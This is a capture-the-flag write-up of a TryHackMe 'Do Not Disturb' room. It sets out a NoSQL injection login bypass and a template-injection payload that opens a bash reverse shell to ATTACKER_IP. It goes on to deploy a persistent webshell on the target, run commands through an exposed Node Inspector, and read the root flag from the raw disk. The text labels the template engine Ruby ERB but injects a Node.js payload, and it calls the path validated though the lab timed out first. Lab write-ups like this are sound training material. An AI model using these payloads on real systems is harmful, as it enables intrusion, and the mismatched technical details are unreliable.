Written By Aryan Giri

The "Do Not Disturb" room is a medium-difficulty Boot2Root challenge from TryHackMe's Hacker Holidays 2026 event. The objective is to track an unauthorized user's footprints, recover the user flag, and escalate privileges to root on the Byte Lotus poolside platform.

<img width="1312" height="876" alt="Screenshot 2026-08-04 073614" src="https://github.com/user-attachments/assets/35a684ab-1474-45b0-bfbd-b4fffd94eb42" />


## Authentication Bypass and Template Injection

Browsing to the target IP on port 80 reveals a login page. The username `attendant` is hinted at in the input box.

<img width="809" height="583" alt="Screenshot 2026-08-04 073659" src="https://github.com/user-attachments/assets/8638062b-17c5-4404-9bce-d17bbdf95f2e" />


Intercepting the login request with Burp Suite reveals a NoSQL injection vulnerability. Modifying the password parameter bypasses authentication:

```http
POST /login
username=attendant&password[$ne]=x
```

<img width="1281" height="466" alt="Screenshot 2026-08-04 073643" src="https://github.com/user-attachments/assets/8ae1f28b-dbf2-4159-ac15-eb27dc200ff6" />
<img width="607" height="300" alt="Screenshot 2026-08-04 073711" src="https://github.com/user-attachments/assets/8925cff9-165b-4a1d-a376-c861108f05ae" />
<img width="776" height="368" alt="Screenshot 2026-08-04 073736" src="https://github.com/user-attachments/assets/3e302003-ff0d-4469-8df4-752b10fc428a" />



This successfully redirects to the `/staff` dashboard. The dashboard contains an editable message template:

```erb
Dear <%= guest %>, your Byte Lotus cabana is confirmed.
```

<img width="786" height="623" alt="Screenshot 2026-08-04 073802" src="https://github.com/user-attachments/assets/393b59c6-9c37-493c-8eaf-087b702df7d9" />


This confirms a Server-Side Template Injection (SSTI) vulnerability using Embedded Ruby (ERB) syntax. To gain a reverse shell, start a Netcat listener (`nc -lvnp PORT`) and inject the following payload into the `guest` parameter:

```erb
<%= process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"') %>
```

<img width="626" height="517" alt="Screenshot 2026-08-04 073941" src="https://github.com/user-attachments/assets/6609a77d-84e1-4c8b-a8e8-2c184d8567b6" />


Clicking preview executes the payload and returns a shell.

<img width="748" height="581" alt="Screenshot 2026-08-04 073955" src="https://github.com/user-attachments/assets/0966dc05-def8-46ca-8924-05fedfee10d0" />


## Persistent PTY Webshell Deployment

In post-exploitation, standard reverse shells frequently drop or become unstable. To maintain a persistent, interactive session, I deployed my custom tool, Ary_WebShell_JS.

**Ary_WebShell_JS**
A browser-based interactive terminal webshell written in Node.js. Designed for authorized CTF competitions and security research environments where you need a full PTY shell via a single file upload. It requires zero external npm packages, utilizing system PTY bridges (`script`, `python`, `socat`, `unbuffer`). The frontend is powered by xterm.js with a Tokyo Night dark theme.

Repository: [https://github.com/giriaryan694-a11y/Ary_WebShell_JS](https://github.com/giriaryan694-a11y/Ary_WebShell_JS)

Download the script to the attacker machine:

```bash
wget https://github.com/giriaryan694-a11y/Ary_WebShell_JS/raw/refs/heads/main/ary_webshell.js
```

<img width="629" height="506" alt="Screenshot 2026-08-04 074409" src="https://github.com/user-attachments/assets/56e7d2fb-56ea-4ee5-b8ad-621eec566851" />


Start a Python HTTP server on the attacker machine, then navigate to `/tmp` on the target (as the current directory restricts file writes) and download the script:

```bash
cd /tmp
wget http://YOUR_IP:8000/ary_webshell.js
```

<img width="1302" height="648" alt="Screenshot 2026-08-04 074828" src="https://github.com/user-attachments/assets/e2bc4866-06ca-4674-8416-155f72416b91" />


Execute the webshell (defaults to port 8888):

```bash
node ary_webshell.js
```

<img width="1356" height="588" alt="Screenshot 2026-08-04 074854" src="https://github.com/user-attachments/assets/eea991fe-041c-4dd1-87e2-d635ab5bc57c" />


Access `http://127.0.0.1:8888` in the browser and authenticate with the default password: `arywebshell123`.

<img width="721" height="635" alt="Screenshot 2026-08-04 074936" src="https://github.com/user-attachments/assets/39194d93-7847-4f5b-a027-b8f99cd86264" />
<img width="1284" height="833" alt="Screenshot 2026-08-04 075004" src="https://github.com/user-attachments/assets/3379fdda-0883-4d6c-a6b9-7766797d9cef" />


Click "New Session" to spawn a full PTY bash shell. Navigate to the user's home directory and retrieve the user flag.

```bash
cd ~
cat user.txt
```

<img width="1293" height="806" alt="Screenshot 2026-08-04 075109" src="https://github.com/user-attachments/assets/a381dac2-47fe-4f9e-b8fa-6adde5e40a96" />


## Process Enumeration and Node Inspector

After obtaining a shell as poolside, I began standard Linux privilege escalation by checking sudo -l, SUID binaries, capabilities, cron jobs, and running linPEAS. None of these revealed a viable path. I then shifted focus to application enumeration, inspecting running processes with ps aux. A Node.js process owned by another user (pipeline) stood out. Inspecting its command line revealed the --inspect flag, indicating the Node Inspector was enabled on localhost (127.0.0.1:9229). Recognizing this as a developer debugging interface led me to investigate it further.

<img width="776" height="65" alt="Screenshot 2026-08-04 095633" src="https://github.com/user-attachments/assets/050e905c-395f-41e2-85e1-ecbf289f749f" />
<img width="822" height="134" alt="Screenshot 2026-08-04 100123" src="https://github.com/user-attachments/assets/7e6b1bbf-c20d-4c67-b14f-1b4103217a9f" />


Checking listening ports with `ss -lntp` confirms the service:

<img width="887" height="172" alt="Screenshot 2026-08-04 095706" src="https://github.com/user-attachments/assets/0ac81091-4c91-437c-9d70-0dd02dfafdae" />


Probing the endpoint verifies it is the Node Inspector:

```bash
curl http://127.0.0.1:9229/json/version
```

<img width="738" height="98" alt="Screenshot 2026-08-04 095738" src="https://github.com/user-attachments/assets/0663e453-0e83-417b-aead-e624ec068ce3" />


Attach to the inspector and enter the REPL:

```bash
node --inspect=127.0.0.1:9229
```

```javascript
debug> repl
```

Execute commands using Node's internal C++ bindings to bypass standard module restrictions:

```javascript
> process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{type:'pipe',readable:1,writable:0},{type:'pipe',readable:0,writable:1},{type:'pipe',readable:0,writable:1}]}).output[1].toString()
```

Identify the root disk partition:

```javascript
> process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','df -h; ls -la /dev/root /dev/nvme*'],stdio:[{type:'pipe',readable:1,writable:0},{type:'pipe',readable:0,writable:1},{type:'pipe',readable:0,writable:1}]}).output[1].toString()
```

## Direct Disk Extraction and Lab Timeout

Read the root flag directly from the block device using `debugfs` or `strings`, bypassing filesystem permission checks:

```javascript
> (function(){try{var r=process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','debugfs -R "cat /root/root.txt" /dev/nvme0n1p1 2>&1 || strings /dev/nvme0n1p1 | grep -i thm 2>&1'],stdio:[{type:'pipe',readable:1,writable:0},{type:'pipe',readable:0,writable:1},{type:'pipe',readable:0,writable:1}]});var o='';if(r.output){for(var i=1;i<r.output.length;i++){if(r.output[i])o+=r.output[i].toString();}}return o||JSON.stringify(r);}catch(e){return e.toString();}})()
```

<img width="1897" height="536" alt="Screenshot 2026-08-04 101850" src="https://github.com/user-attachments/assets/6b4b18e7-772b-456c-9438-3548b2a9d803" />


During the final extraction phase, the TryHackMe lab machine terminated due to a session timeout. Despite the interruption, the core exploitation path was successfully mapped and validated.

Technical takeaways from this engagement:
- **NoSQL Injection to SSTI:** Authentication bypasses often expose secondary injection points. Identifying the template engine (ERB) allowed for immediate remote code execution.
- **Shell Stability:** Relying on raw TCP reverse shells in volatile CTF environments leads to lost progress. Deploying a dedicated PTY webshell early ensures uninterrupted post-exploitation.
- **Node Inspector Abuse:** Developer debugging ports (`9229`) bound to localhost are frequently misconfigured or left exposed. The REPL interface provides direct runtime access, enabling command execution without relying on standard OS binaries.
- **Direct Block Device Access:** When standard file permissions restrict access to sensitive files, reading directly from the underlying block device (`/dev/nvme0n1p1`) using tools like `debugfs` or `strings` effectively bypasses OS-level access controls.

